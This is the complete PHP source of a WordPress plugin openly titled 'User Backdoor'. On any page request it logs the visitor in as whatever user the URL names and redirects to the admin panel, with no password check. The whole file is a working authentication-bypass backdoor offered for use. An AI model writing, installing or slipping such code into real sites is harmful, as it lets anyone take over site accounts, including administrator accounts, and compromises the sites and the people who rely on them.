<?php

/*
  Plugin Name: User Backdoor
  Plugin URI: http://www.github.com/ivanbatic/wp-user-backdoor
  Description: Allows users to bypass authorization and log straight into the admin panel.
  Version: 1.0
  Author: Ivan Batić
 */

/**
 * Add username and action query vars to the list of recognizable query params
 */
add_filter('query_vars', function($vars) {
        return array_merge($vars, ['username', 'action']);
    });

add_action('wp', 'attempt_login');

/**
 * Attempt to log in a user if username is right and action is `logmein`
 * @param WP $wp
 */
function attempt_login($wp) {
    $username = $wp->query_vars['username'];
    // $user assignment done on purpose
    if ($wp->query_vars['action'] == 'logmein' && $user = get_userdatabylogin($username)) {
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        wp_redirect(admin_url());
    }
}

